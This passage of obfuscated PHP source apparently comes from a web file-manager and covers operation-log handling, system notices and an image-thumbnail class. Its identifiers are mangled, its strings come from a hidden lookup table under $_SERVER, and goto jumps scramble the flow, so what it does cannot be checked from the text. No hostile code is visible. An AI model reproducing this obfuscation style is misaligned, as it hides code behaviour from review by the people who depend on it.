$cÌëƒå´Ç = array($eÀÅŠí§Áš[2475] => $D‡‘šù ˆ); } else { if (is_array($cÌëƒå´Ç)) { $cÌëƒå´Ç[$eÀÅŠí§Áš[2475]] = $D‡‘šù ˆ; } else { $cÌëƒå´Ç = array($eÀÅŠí§Áš[1025] => $cÌëƒå´Ç, $eÀÅŠí§Áš[2475] => $D‡‘šù ˆ); } } $cÌëƒå´Ç = array($eÀÅŠí§Áš[1417] => Session::sign(), $eÀÅŠí§Áš[1418] => $b‚œåŞÑã×, $eÀÅŠí§Áš[39] => $E‡¼å¨˜á, $eÀÅŠí§Áš[1420] => json_encode($cÌëƒå´Ç)); goto cŞ÷İ«’; fÂ²¥÷¤Ç¢: $eÀÅŠí§Áš =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->typeList[$E‡¼å¨˜á])) { return; } $b‚œåŞÑã× = USER_ID ? USER_ID : (isset($cÌëƒå´Ç[$eÀÅŠí§Áš[1427]]) ? $cÌëƒå´Ç[$eÀÅŠí§Áš[1427]] : 0); goto bÇÂ‰„•; cŞ÷İ«’: parent::add($cÌëƒå´Ç); goto BÂ‰—¥È×; BÂ‰—¥È×: } public function remove($DË©È¥œ—ë) { $this->where(array($_SERVER[¹÷ˆ§éÒ°ú][396] => $DË©È¥œ—ë))->delete(); } private function _makeOrder($A½ô†»ãË = '') { goto cŠ™ƒÚ–•ó; FõÓÂ‰ÛÑÂ: return $this->order($A½ô†»ãË); goto fîÑ–ª·ñÓ; E…ÆØ“ºŸĞ: $Eâó‡İÅçå = Input::get($D‡‹èç¥Çç[419], $D‡‹èç¥Çç[17], $D‡‹èç¥Çç[2252], array($D‡‹èç¥Çç[2178], $D‡‹èç¥Çç[415])); $Eâó‡İÅçå = $CÏ…£’Òš”[$Eâó‡İÅçå]; $A½ô†»ãË = $A½ô†»ãË . "{$aö¿á‡„ùî}\40{$Eâó‡İÅçå}"; goto FõÓÂ‰ÛÑÂ; cŠ™ƒÚ–•ó: $D‡‹èç¥Çç =& $_SERVER[¹÷ˆ§éÒ°ú]; $aö¿á‡„ùî = $D‡‹èç¥Çç[199]; $CÏ…£’Òš” = array($D‡‹èç¥Çç[413] => $D‡‹èç¥Çç[414], $D‡‹èç¥Çç[415] => $D‡‹èç¥Çç[416]); goto E…ÆØ“ºŸĞ; fîÑ–ª·ñÓ: } public function get($C¿ÖÖÅ‡ = '') { goto fÒ†Ùïª°µ; D‚‰šÈÉ¹ô: if (!empty($C¿ÖÖÅ‡[$c†›íŸå‡¨[2475]])) { $bÎ‡ÊÂŠ°Â[$c†›íŸå‡¨[416]] = array($c†›íŸå‡¨[746], "\x25{$C¿ÖÖÅ‡[$c†›íŸå‡¨[2475]]}\x25"); } $d“í”Ú¦ ¯ = $this->_makeOrder()->where($bÎ‡ÊÂŠ°Â)->selectPage(); if (empty($d“í”Ú¦ ¯[$c†›íŸå‡¨[365]])) { show_json(array(), !0, $d“í”Ú¦ ¯[$c†›íŸå‡¨[362]]); } goto CÓÛÍß›˜ª; E©¨ñ£íÈŠ: if ($C¿ÖÖÅ‡[$c†›íŸå‡¨[1427]]) { $bÎ‡ÊÂŠ°Â[$c†›íŸå‡¨[1427]] = $C¿ÖÖÅ‡[$c†›íŸå‡¨[1427]]; } if (isset($C¿ÖÖÅ‡[$c†›íŸå‡¨[697]])) { $E÷åÀ¥ì›¸ = $C¿ÖÖÅ‡[$c†›íŸå‡¨[697]]; $bŸù”’ãİ¢ = isset($C¿ÖÖÅ‡[$c†›íŸå‡¨[460]]) ? $C¿ÖÖÅ‡[$c†›íŸå‡¨[460]] : time(); $bÎ‡ÊÂŠ°Â[$c†›íŸå‡¨[199]] = array($c†›íŸå‡¨[332], array($E÷åÀ¥ì›¸, $bŸù”’ãİ¢)); } if ($C¿ÖÖÅ‡[$c†›íŸå‡¨[39]]) { $FÍµÄ›¡Âˆ = explode($c†›íŸå‡¨[57], $C¿ÖÖÅ‡[$c†›íŸå‡¨[39]]); $BíñŞÂ‡óğ = $this->typeFile(); $dÔÉä¹­¸¿ = array(); foreach ($FÍµÄ›¡Âˆ as $AÉ„Î„íÁË) { $dÔÉä¹­¸¿[] = $AÉ„Î„íÁË; if (isset($BíñŞÂ‡óğ[$AÉ„Î„íÁË])) { $dÔÉä¹­¸¿ = array_merge($dÔÉä¹­¸¿, $BíñŞÂ‡óğ[$AÉ„Î„íÁË]); } } $dÔÉä¹­¸¿ = array_unique($dÔÉä¹­¸¿); if ($dÔÉä¹­¸¿) { $bÎ‡ÊÂŠ°Â[$c†›íŸå‡¨[39]] = array($c†›íŸå‡¨[17], $dÔÉä¹­¸¿); } } goto D‚‰šÈÉ¹ô; CÓÛÍß›˜ª: $d“í”Ú¦ ¯[$c†›íŸå‡¨[365]] = $this->logList($d“í”Ú¦ ¯[$c†›íŸå‡¨[365]]); return $d“í”Ú¦ ¯; goto aÀÔè¤ô«Ú; fÒ†Ùïª°µ: $c†›íŸå‡¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$C¿ÖÖÅ‡) { show_json(array()); } $bÎ‡ÊÂŠ°Â = array(); goto E©¨ñ£íÈŠ; aÀÔè¤ô«Ú: } private function ipAddress(&$d³Ñªöï®) { $dŒ°”ÜÄ‡Ÿ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($d³Ñªöï®[$dŒ°”ÜÄ‡Ÿ[2475]])) { $A÷ŒÕåº = IpLocation::get($d³Ñªöï®[$dŒ°”ÜÄ‡Ÿ[2475]]); } else { $A÷ŒÕåº = LNG($dŒ°”ÜÄ‡Ÿ[2476]); } $d³Ñªöï®[$dŒ°”ÜÄ‡Ÿ[2477]] = $A÷ŒÕåº; } private function descZipDownload($A¸ õ¬Ø¬, &$DÑ¯ÙÒÇ¼Ú) { $D÷¯ô×óæÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($A¸ õ¬Ø¬[$D÷¯ô×óæÚ[2478]])) { return; } $bº»“–šãÀ = json_decode($A¸ õ¬Ø¬[$D÷¯ô×óæÚ[2478]], !0); foreach ($bº»“–šãÀ as $c‹¡â‹ççò) { if (!IO::init($c‹¡â‹ççò[$D÷¯ô×óæÚ[87]])) { continue; } if (!($DéÏ÷ê„´Ã = IO::infoFull($c‹¡â‹ççò[$D÷¯ô×óæÚ[87]]))) { continue; } $A¸ õ¬Ø¬[$D÷¯ô×óæÚ[87]] = $c‹¡â‹ççò[$D÷¯ô×óæÚ[87]]; $DÑ¯ÙÒÇ¼Ú[] = $A¸ õ¬Ø¬[$D÷¯ô×óæÚ[380]] = $DéÏ÷ê„´Ã[$D÷¯ô×óæÚ[380]]; $DÑ¯ÙÒÇ¼Ú[] = $A¸ õ¬Ø¬[$D÷¯ô×óæÚ[2295]] = $DéÏ÷ê„´Ã[$D÷¯ô×óæÚ[474]]; break; } return $A¸ õ¬Ø¬; } private function getSourceList(&$DÀµïö¨‰Ö) { $F®ø¤¶„ÚÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eØÍİ†Èõ = array(); foreach ($DÀµïö¨‰Ö as $D»ñÓ™ã½ => $b«õ…äÜ‰ì) { goto DÙÅ÷×‘; DÙÅ÷×‘: $Cƒ¡Ë³µÎ = json_decode($b«õ…äÜ‰ì[$F®ø¤¶„ÚÚ[416]], !0); if ($b«õ…äÜ‰ì[$F®ø¤¶„ÚÚ[39]] == $F®ø¤¶„ÚÚ[2069]) { $Cƒ¡Ë³µÎ = $this->descZipDownload($Cƒ¡Ë³µÎ, $eØÍİ†Èõ); $DÀµïö¨‰Ö[$D»ñÓ™ã½][$F®ø¤¶„ÚÚ[416]] = json_encode($Cƒ¡Ë³µÎ); continue; } if (strpos($b«õ…äÜ‰ì[$F®ø¤¶„ÚÚ[39]], $F®ø¤¶„ÚÚ[2296]) !== 0) { goto C¨×èƒ¿ÃÑ; fÇ‡Œµ¾: $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[380]] = $e‘‡¢ã¤Ï[$F®ø¤¶„ÚÚ[380]]; $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[2295]] = $e‘‡¢ã¤Ï[$F®ø¤¶„ÚÚ[474]]; $DÀµïö¨‰Ö[$D»ñÓ™ã½][$F®ø¤¶„ÚÚ[416]] = json_encode($Cƒ¡Ë³µÎ); goto fèß¾±âæ£; C¨×èƒ¿ÃÑ: if (!isset($Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[87]]) || strpos($b«õ…äÜ‰ì[$F®ø¤¶„ÚÚ[39]], $F®ø¤¶„ÚÚ[2479]) !== 0) { continue; } if (!IO::init($Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[87]])) { continue; } if (!($e‘‡¢ã¤Ï = IO::infoFull($Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[87]]))) { continue; } goto fÇ‡Œµ¾; fèß¾±âæ£: continue; goto E‘÷ëÄåè£; E‘÷ëÄåè£: } goto b¡Ö÷Ï†Ó; d´É“ÑèÙï: if ($Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[39]] == $F®ø¤¶„ÚÚ[2303]) { $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[416]][$F®ø¤¶„ÚÚ[380]]; } goto BŒá±—¸¦Ç; b¡Ö÷Ï†Ó: $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[380]]; $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[2295]]; if ($Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[39]] == $F®ø¤¶„ÚÚ[505]) { $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[416]][$F®ø¤¶„ÚÚ[998]]; $eØÍİ†Èõ[] = $Cƒ¡Ë³µÎ[$F®ø¤¶„ÚÚ[416]][$F®ø¤¶„ÚÚ[999]]; } goto d´É“ÑèÙï; BŒá±—¸¦Ç: } if (!$eØÍİ†Èõ) { return array(); } return Model($F®ø¤¶„ÚÚ[747])->sourceListInfo($eØÍİ†Èõ, !0); } private function logList($BƒÁ£í•³‹) { goto bÎ¢Š¡àíŞ; e¼œ×íàõ¹: $E”Ôî­‹æ = array(); foreach ($BƒÁ£í•³‹ as $AÓ˜¼ÀÔóï => $D×„á¿Ì) { goto cÎâ†ğï‡°; Dóõ‹îÖáÕ: $D×„á¿Ì[$B“õøÖ×‹è[38]] = isset($dš¤ñß¶¿‰[$B“õøÖ×‹è[38]]) ? $dš¤ñß¶¿‰[$B“õøÖ×‹è[38]] : LNG($B“õøÖ×‹è[2476]); $D×„á¿Ì[$B“õøÖ×‹è[2344]] = isset($dš¤ñß¶¿‰[$B“õøÖ×‹è[2344]]) ? $dš¤ñß¶¿‰[$B“õøÖ×‹è[2344]] : $B“õøÖ×‹è[43]; $D×„á¿Ì[$B“õøÖ×‹è[1332]] = isset($C¨šŒê¾ÕÊ[$b„Û«Ï‹†Å]) ? $C¨šŒê¾ÕÊ[$b„Û«Ï‹†Å] : $e¤‚ÓíÍğë; goto eå¼Æ¢¿¬º; e»ÇŒ¥ÓÅ£: $this->ipAddress($D×„á¿Ì); if (strpos($b„Û«Ï‹†Å, $B“õøÖ×‹è[2296]) === 0 || isset($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2295]])) { goto FÊøÂ¬‘‹¢; d°™Ó¬ˆÖ™: if ($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2308]] && $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2308]][$B“õøÖ×‹è[382]] == $B“õøÖ×‹è[1071]) { $E”Ôî­‹æ[] = $D×„á¿Ì[$B“õøÖ×‹è[378]]; unset($BƒÁ£í•³‹[$AÓ˜¼ÀÔóï]); continue; } goto CóàÙÎ´Ê; FÊøÂ¬‘‹¢: $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[402]] = $aÔƒ²Ëµ•ñ[$d¢‡Í‚¾ö¬[$B“õøÖ×‹è[380]]]; $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2308]] = $aÔƒ²Ëµ•ñ[$d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2295]]]; if ($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[39]] == $B“õøÖ×‹è[505]) { $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[998]] = $aÔƒ²Ëµ•ñ[$d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[998]]]; $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[999]] = $aÔƒ²Ëµ•ñ[$d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[999]]]; } goto fëåÊ‰”‰À; fëåÊ‰”‰À: if ($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[39]] == $B“õøÖ×‹è[2303]) { $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[380]] = $aÔƒ²Ëµ•ñ[$d¢‡Í‚¾ö¬[$B“õøÖ×‹è[416]][$B“õøÖ×‹è[380]]]; } if ($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[39]] == $B“õøÖ×‹è[2064]) { $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2308]] = $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[402]]; $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2295]] = $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2308]][$B“õøÖ×‹è[380]]; $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[402]] = !1; $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[380]] = $B“õøÖ×‹è[43]; } if ($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[402]] && $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[402]][$B“õøÖ×‹è[382]] == $B“õøÖ×‹è[1071]) { $E”Ôî­‹æ[] = $D×„á¿Ì[$B“õøÖ×‹è[378]]; unset($BƒÁ£í•³‹[$AÓ˜¼ÀÔóï]); continue; } goto d°™Ó¬ˆÖ™; CóàÙÎ´Ê: } $D×„á¿Ì[$B“õøÖ×‹è[416]] = $d¢‡Í‚¾ö¬; goto dä±…™­¡; cÎâ†ğï‡°: $b„Û«Ï‹†Å = $D×„á¿Ì[$B“õøÖ×‹è[39]]; $dš¤ñß¶¿‰ = isset($eàö°¯ÈÊ[$D×„á¿Ì[$B“õøÖ×‹è[1427]]]) ? $eàö°¯ÈÊ[$D×„á¿Ì[$B“õøÖ×‹è[1427]]] : !1; $e¤‚ÓíÍğë = strpos($b„Û«Ï‹†Å, $B“õøÖ×‹è[2480]) === 0 ? LNG($B“õøÖ×‹è[2481]) : LNG($B“õøÖ×‹è[2476]); goto Dóõ‹îÖáÕ; dä±…™­¡: unset($D×„á¿Ì[$B“õøÖ×‹è[2482]]); $f«Òœ¬Ç¶[] = $D×„á¿Ì; goto aÎ¦ÇÕÒÀ‹; eå¼Æ¢¿¬º: $D×„á¿Ì[$B“õøÖ×‹è[2251]] = $dš¤ñß¶¿‰; $d¢‡Í‚¾ö¬ = json_decode($D×„á¿Ì[$B“õøÖ×‹è[416]], !0); $D×„á¿Ì[$B“õøÖ×‹è[2475]] = isset($d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2475]]) ? $d¢‡Í‚¾ö¬[$B“õøÖ×‹è[2475]] : $B“õøÖ×‹è[43]; goto e»ÇŒ¥ÓÅ£; aÎ¦ÇÕÒÀ‹: } $this->clearSystemPathLog($E”Ôî­‹æ); goto b®éò¼‡Ï¿; b®éò¼‡Ï¿: return $f«Òœ¬Ç¶; goto a…¢Şİ“ğç; bÎ¢Š¡àíŞ: $B“õøÖ×‹è =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÀ ®å‚¯º = array_to_keyvalue($BƒÁ£í•³‹, $B“õøÖ×‹è[43], $B“õøÖ×‹è[1427]); $eàö°¯ÈÊ = Model($B“õøÖ×‹è[490])->userListInfo(array_unique($cÀ ®å‚¯º)); goto Fìë¶ƒºê÷; Fìë¶ƒºê÷: $aÔƒ²Ëµ•ñ = $this->getSourceList($BƒÁ£í•³‹); $C¨šŒê¾ÕÊ = $this->typeAll(); $f«Òœ¬Ç¶ = array(); goto e¼œ×íàõ¹; a…¢Şİ“ğç: } private function clearSystemPathLog($f÷¨İÄÛ’) { $B„ÃÅ”Îè÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (count($f÷¨İÄÛ’) == 0) { return; } $DÜ¡£óæƒ = array($B„ÃÅ”Îè÷[378] => array($B„ÃÅ”Îè÷[17], array_unique($f÷¨İÄÛ’))); $this->where($DÜ¡£óæƒ)->delete(); } public function deviceList($B·óÚ·±»À, $DÀ­£éª¤¿ = 0) { $eÀ»Óİ¡ù£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B­îùßóá‡ = array($eÀ»Óİ¡ù£[1427] => $B·óÚ·±»À, $eÀ»Óİ¡ù£[199] => array($eÀ»Óİ¡ù£[918], $DÀ­£éª¤¿), $eÀ»Óİ¡ù£[39] => $eÀ»Óİ¡ù£[2037]); $E„›±³â™š = array(); $bÑà„Æ = $this->field($eÀ»Óİ¡ù£[2483])->where($B­îùßóá‡)->order($eÀ»Óİ¡ù£[2306])->limit(50)->select(); foreach ($bÑà„Æ as $AÆé“Âó³ => $b¢Ö¼®œ”Ş) { goto a°Ÿ½”‹á‘; EŠš´”Ä¸±: $this->ipAddress($b¢Ö¼®œ”Ş); $b¢Ö¼®œ”Ş[$eÀ»Óİ¡ù£[416]] = $A¸¦¶À°”; $E„›±³â™š[$b£Œ­áÜ ] = $b¢Ö¼®œ”Ş; goto BÓÅã’¸·É; Bİ±ê‚˜¹†: unset($A¸¦¶À°”[$eÀ»Óİ¡ù£[2475]]); $b£Œ­áÜ  = $this->deviceType($A¸¦¶À°”[$eÀ»Óİ¡ù£[2297]]); if (isset($E„›±³â™š[$b£Œ­áÜ ])) { continue; } goto EŠš´”Ä¸±; a°Ÿ½”‹á‘: if ($AÆé“Âó³ > 0 && abs($b¢Ö¼®œ”Ş[$eÀ»Óİ¡ù£[199]] - $bÑà„Æ[$AÆé“Âó³ - 1][$eÀ»Óİ¡ù£[199]]) < 5) { continue; } $A¸¦¶À°” = json_decode($b¢Ö¼®œ”Ş[$eÀ»Óİ¡ù£[416]], !0); $b¢Ö¼®œ”Ş[$eÀ»Óİ¡ù£[2475]] = isset($A¸¦¶À°”[$eÀ»Óİ¡ù£[2475]]) ? $A¸¦¶À°”[$eÀ»Óİ¡ù£[2475]] : $eÀ»Óİ¡ù£[43]; goto Bİ±ê‚˜¹†; BÓÅã’¸·É: } return array_values($E„›±³â™š); } public function deviceType($EÇ‰œ‘êò) { return $EÇ‰œ‘êò; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\x6e\x6f\x74\x69\x63\145\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\143\157\x6e\164\145\x6e\164", "\141\x75\164\x68", "\x6d\157\144\x65", "\164\x69\155\x65", "\164\x79\160\145", "\x6c\145\166\x65\154", "\x65\x6e\x61\142\x6c\145", "\x73\x6f\162\x74"); public function listData($b‘éÅÀ’ÔÅ = false, $BšÉÈ»¦ôê = "\163\157\x72\x74", $Fß±“Ñ£¼ = false) { return parent::listData($b‘éÅÀ’ÔÅ, $BšÉÈ»¦ôê, $Fß±“Ñ£¼); } public function add($CËôäÅ¸Ëµ) { $DšñÛ„ØÈÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C±º¶æ®ÒÁ = time(); if ($CËôäÅ¸Ëµ[$DšñÛ„ØÈÏ[22]] == $DšñÛ„ØÈÏ[2484]) { $C±º¶æ®ÒÁ = strtotime($CËôäÅ¸Ëµ[$DšñÛ„ØÈÏ[202]]); } $CËôäÅ¸Ëµ[$DšñÛ„ØÈÏ[202]] = $C±º¶æ®ÒÁ; return parent::insert($CËôäÅ¸Ëµ); } public function update($BÆœ¬¡æ¯, $e–åïÁÒ…¡) { goto aóÂ‡Îª·Â; aóÂ‡Îª·Â: $b¹ììù·ùÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÇ–­© = $this->listData($BÆœ¬¡æ¯); if (!$cÇ–­©) { return !1; } goto eë¥ÙÑĞ…; bàÖäºƒˆí: return parent::update($BÆœ¬¡æ¯, $e–åïÁÒ…¡); goto AØßÅÌŞò‹; eë¥ÙÑĞ…: $eªŸİãÙ˜ = time(); if ($e–åïÁÒ…¡[$b¹ììù·ùÅ[22]] == $b¹ììù·ùÅ[2484]) { $eªŸİãÙ˜ = strtotime($e–åïÁÒ…¡[$b¹ììù·ùÅ[202]]); } $e–åïÁÒ…¡[$b¹ììù·ùÅ[202]] = $eªŸİãÙ˜; goto bàÖäºƒˆí; AØßÅÌŞò‹: } public function remove($FØ•·ÙŠäÍ) { $EŠˆÇÌÆÔ¢ = $this->listData($FØ•·ÙŠäÍ); if (!$EŠˆÇÌÆÔ¢ || $EŠˆÇÌÆÔ¢[$_SERVER[¹÷ˆ§éÒ°ú][1071]]) { return !1; } return parent::remove($FØ•·ÙŠäÍ); } public function sort($D±ã…¾†—µ, $cÙÛ×¿¢À) { return parent::update($D±ã…¾†—µ, $cÙÛ×¿¢À); } public function enable($fñˆÑÖÕÊ”, $aß„ª¾é¥°) { return parent::update($fñˆÑÖÕÊ”, array($_SERVER[¹÷ˆ§éÒ°ú][2485] => $aß„ª¾é¥°)); } private function initUserOption() { $f’°áğ“–” =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->optionType = $f’°áğ“–”[2486]; $this->modelType = $f’°áğ“–”[2487]; $this->field = array($f’°áğ“–”[2488], $f’°áğ“–”[38], $f’°áğ“–”[202], $f’°áğ“–”[39], $f’°áğ“–”[2489], $f’°áğ“–”[684], $f’°áğ“–”[195]); } public function userNoticeGet($e½îâÑÌ¡¯ = false) { $this->initUserOption(); return parent::listData($e½îâÑÌ¡¯, $_SERVER[¹÷ˆ§éÒ°ú][378], !0); } public function userNoticeAdd($AÅÎõˆÜê·) { $Ağ©Óİ¤ã« =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initUserOption(); $eëä”¼ ãĞ = $this->findByKey($Ağ©Óİ¤ã«[2488], $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[378]]); if ($eëä”¼ ãĞ) { return !0; } $cßÚ“ê›” = array($Ağ©Óİ¤ã«[2488] => $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[378]], $Ağ©Óİ¤ã«[38] => $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[38]], $Ağ©Óİ¤ã«[202] => $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[202]], $Ağ©Óİ¤ã«[39] => isset($AÅÎõˆÜê·[$Ağ©Óİ¤ã«[39]]) ? $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[39]] : 1, $Ağ©Óİ¤ã«[2489] => isset($AÅÎõˆÜê·[$Ağ©Óİ¤ã«[2489]]) ? $AÅÎõˆÜê·[$Ağ©Óİ¤ã«[2489]] : 0, $Ağ©Óİ¤ã«[684] => 0, $Ağ©Óİ¤ã«[195] => 0); return parent::insert($cßÚ“ê›”); } public function userNoticeEdit($eøäÄ¹ŞÖÄ, $B†ÄÕ’¸©) { $this->initUserOption(); return parent::update($eøäÄ¹ŞÖÄ, $B†ÄÕ’¸©); } } goto BˆÏá«…; AÍ¤íºÍÎ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($b‡¶ó™À¦Î, $fˆª„Ü©¤Ò) { goto Bç¯àô†‹Š; Bç¯àô†‹Š: $this->srcFile = $b‡¶ó™À¦Î; $this->echoType = $fˆª„Ü©¤Ò; $this->im = self::image($b‡¶ó™À¦Î); goto d¨‹£õ”ì; d¨‹£õ”ì: if (!$this->im) { return !1; } $A¸»©šŞª = $_SERVER[¹÷ˆ§éÒ°ú][43]; $this->imgData = GetImageSize($b‡¶ó™À¦Î, $A¸»©šŞª); goto a•¸¹®®ê¤; a•¸¹®®ê¤: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto F»ƒÇğ„œ´; F»ƒÇğ„œ´: } public static function image($Bæ¶‹±¸Ş©) { $aÕò˜Šå‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cªÎ‚†®ß = $aÕò˜Šå‘[43]; $aÎö˜é„ì = GetImageSize($Bæ¶‹±¸Ş©, $cªÎ‚†®ß); $eÇŒ¿¬ÎˆÍ = !1; switch ($aÎö˜é„ì[2]) { case IMAGETYPE_GIF: if (!function_exists($aÕò˜Šå‘[1855])) { break; } $eÇŒ¿¬ÎˆÍ = imagecreatefromgif($Bæ¶‹±¸Ş©); break; case IMAGETYPE_JPEG: if (!function_exists($aÕò˜Šå‘[1856])) { break; } $eÇŒ¿¬ÎˆÍ = imagecreatefromjpeg($Bæ¶‹±¸Ş©); break; case IMAGETYPE_PNG: if (!function_exists($aÕò˜Šå‘[1857])) { break; } $eÇŒ¿¬ÎˆÍ = @imagecreatefrompng($Bæ¶‹±¸Ş©); imagesavealpha($eÇŒ¿¬ÎˆÍ, !0); break; case IMAGETYPE_XBM: $eÇŒ¿¬ÎˆÍ = imagecreatefromxbm($Bæ¶‹±¸Ş©); break; case IMAGETYPE_WBMP: $eÇŒ¿¬ÎˆÍ = imagecreatefromwbmp($Bæ¶‹±¸Ş©); break; case IMAGETYPE_BMP: $eÇŒ¿¬ÎˆÍ = imagecreatefrombmp($Bæ¶‹±¸Ş©); break; default: break; } return $eÇŒ¿¬ÎˆÍ; } public static function imageSize($bôËÌÉ–½ğ) { $DÈôŞŒÑ—Ô =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÊ×êÀèä¸ = GetImageSize($bôËÌÉ–½ğ); if (!$EÊ×êÀèä¸) { return !1; } return array($DÈôŞŒÑ—Ô[1858] => $EÊ×êÀèä¸[0], $DÈôŞŒÑ—Ô[1859] => $EÊ×êÀèä¸[1]); } function distortion($DÉº”ÅÛÑ, $Câá„Ù–½², $C›²Ã×) { $cì –îÚ›Ÿ = $this->creatImage($this->im, $Câá„Ù–½², $C›²Ã×, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cì –îÚ›Ÿ, $DÉº”ÅÛÑ); } function prorate($c‰ÄÌÆß¥°, $B›ì×ÊÉÆŞ, $bÏ¸Ù×ò‡) { $dÛ“¦ëÀõ‘ = $B›ì×ÊÉÆŞ / $bÏ¸Ù×ò‡; $F˜‚²ëÜî = $this->srcW / $this->srcH; if ($dÛ“¦ëÀõ‘ <= $F˜‚²ëÜî) { $föÔ«ƒÜ½è = $B›ì×ÊÉÆŞ; $EëŞì¿É Š = $föÔ«ƒÜ½è * ($this->srcH / $this->srcW); } else { $EëŞì¿É Š = $bÏ¸Ù×ò‡; $föÔ«ƒÜ½è = $EëŞì¿É Š * ($this->srcW / $this->srcH); } if ($this->srcW > $B›ì×ÊÉÆŞ || $this->srcH > $bÏ¸Ù×ò‡) { $EŞ­‹Â¼Å = $this->creatImage($this->im, $föÔ«ƒÜ½è, $EëŞì¿É Š, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $EŞ­‹Â¼Å = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $EŞ­‹Â¼Å = $this->autoRotate($EŞ­‹Â¼Å); return $this->echoImage($EŞ­‹Â¼Å, $c‰ÄÌÆß¥°); } private function autoRotate($f«ËºÍÔñ§) { goto aˆ‡×ë‰Ù¹; F¯Ä™œÁÆù: if (!$DµŠ‚Š‹Ğî || !isset($DµŠ‚Š‹Ğî[$f™ñÀ¶[1861]]) || $DµŠ‚Š‹Ğî[$f™ñÀ¶[1861]] == 1) { return $f«ËºÍÔñ§; } $d°Æƒ°Æ÷÷ = 0; if ($DµŠ‚Š‹Ğî[$f™ñÀ¶[1861]] == 6) { $d°Æƒ°Æ÷÷ = 90; } goto b·‰¬À†â¢; b·‰¬À†â¢: if ($DµŠ‚Š‹Ğî[$f™ñÀ¶[1861]] == 8) { $d°Æƒ°Æ÷÷ = 270; } if ($DµŠ‚Š‹Ğî[$f™ñÀ¶[1861]] == 3) { $d°Æƒ°Æ÷÷ = 180; } return $this->rotateDegree($f«ËºÍÔñ§, $d°Æƒ°Æ÷÷); goto EÍ¹° å¦; aˆ‡×ë‰Ù¹: $f™ñÀ¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$f«ËºÍÔñ§ || !function_exists($f™ñÀ¶[1860])) { return $f«ËºÍÔñ§; } $DµŠ‚Š‹Ğî = exif_read_data($this->srcFile); goto F¯Ä™œÁÆù; EÍ¹° å¦: } private function rotateDegree($b³½‰¡×¿Š, $b¢˜µ¥Å…) { if (!$b³½‰¡×¿Š || $b¢˜µ¥Å… % 360 === 0 || !function_exists($_SERVER[¹÷ˆ§éÒ°ú][1862])) { return $b³½‰¡×¿Š; } $B•‚¡¬‹«¿ = imageRotate($b³½‰¡×¿Š, 360 - $b¢˜µ¥Å…, 0); imageDestroy($b³½‰¡×¿Š); return $B•‚¡¬‹«¿ ? $B•‚¡¬‹«¿ : $b³½‰¡×¿Š; } function cut($aù‘—±“»ã, $b¤ØÎÇ…, $F£¬ß”äõ») { goto BèŠôîÇ¦ë; fáƒïÕó‘: $bÎ—–Ç‘ = $this->creatImage($this->im, $f’‰ôšß¢Ë, $bÑ‹ƒ§Ô¹Æ, 0, 0, 0, 0, $this->srcW, 